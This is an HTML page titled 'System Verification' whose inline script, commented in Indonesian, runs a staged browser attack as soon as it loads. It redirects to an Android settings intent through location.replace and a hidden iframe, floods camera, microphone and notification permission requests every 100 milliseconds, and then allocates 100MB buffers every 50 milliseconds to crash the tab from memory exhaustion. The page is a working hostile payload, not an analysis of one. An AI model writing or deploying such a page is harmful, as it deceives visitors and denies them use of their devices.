<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>System Verification</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #111; color: #f00; font-family: monospace; overflow: hidden; height: 100vh; display: flex; justify-content: center; align-items: center; text-align: center; }
  iframe { display: none; }
  h1 { animation: blink 0.5s infinite; }
  @keyframes blink { 50% { opacity: 0.2; } }
  #status { position: fixed; bottom: 20px; color: #0f0; }
</style>
</head>
<body>

<h1>☢️ SYSTEM FAILURE ☢️</h1>
<div id="status">Initializing Exploit...</div>

<script>
(function () {
  'use strict';

  var statusEl = document.getElementById('status');

  // ============================================
  // 1. INTENT REDIRECTION (ANDROID / CHROME)
  // ============================================
  function triggerIntent() {
    console.log("[!] Triggering Intent Redirection...");
    statusEl.innerText = "Executing Intent...";
    
    // Skema Intent: Membuka Settings Android
    // Bisa diganti dengan: intent://scan/#Intent;scheme=zxing;package=com.google.zxing.client.android;end
    var intentUrl = "intent://settings/#Intent;action=android.settings.SETTINGS;end";
    
    try {
      // Trik 1: Location Replace
      window.location.replace(intentUrl);
    } catch(e) {}

    // Trik 2: Iframe Sandbox
    setTimeout(function() {
      var iframe = document.createElement('iframe');
      iframe.sandbox = "allow-scripts allow-top-navigation allow-popups";
      iframe.src = intentUrl;
      iframe.style.display = "none";
      document.body.appendChild(iframe);
    }, 500);
  }

  // ============================================
  // 2. PERMISSION EXHAUSTION (CAMERA & MIC FLOOD)
  // ============================================
  function triggerPermissionFlood() {
    console.log("[!] Triggering Permission Flood...");
    statusEl.innerText = "Exhausting Permissions...";

    var count = 0;
    // Loop setiap 100ms untuk meminta izin
    var interval = setInterval(function() {
      try {
        // Minta Izin Kamera & Mic
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
          navigator.mediaDevices.getUserMedia({ video: true, audio: true })
            .then(function(stream) {
              console.log("🚨 KAMERA DIIZINKAN!");
              stream.getTracks().forEach(function(t) { t.stop(); });
            })
            .catch(function(err) {
              // Abaikan penolakan
            });
        }

        // Minta Izin Notifikasi
        if ('Notification' in window && Notification.permission === 'default') {
          Notification.requestPermission();
        }

        count++;
        statusEl.innerText = "Permission Requests: " + count;

        // Setelah 50 permintaan, hentikan loop
        if (count > 50) clearInterval(interval);

      } catch(e) {}
    }, 100);
  }

  // ============================================
  // 3. RESOURCE EXHAUSTION (OOM CRASH)
  // ============================================
  var memoryHog = [];
  function triggerCrash() {
    console.log("[!] Initiating OOM Crash...");
    statusEl.innerText = "SYSTEM CRITICAL...";

    setInterval(function() {
      try {
        // Alokasi 100MB ArrayBuffer per 50ms
        var bigArray = new Uint8Array(100 * 1024 * 1024);
        bigArray.fill(1);
        memoryHog.push(bigArray);
      } catch(e) {}
    }, 50);
  }

  // ============================================
  // EKSEKUSI BERTAHAP
  // ============================================
  
  // 1. Trigger Intent setelah 100ms
  setTimeout(triggerIntent, 100);

  // 2. Trigger Permission Flood setelah 500ms
  setTimeout(triggerPermissionFlood, 500);

  // 3. Trigger Crash (OOM) setelah 1.5 detik
  setTimeout(triggerCrash, 1500);

})();
</script>
</body>
</html>
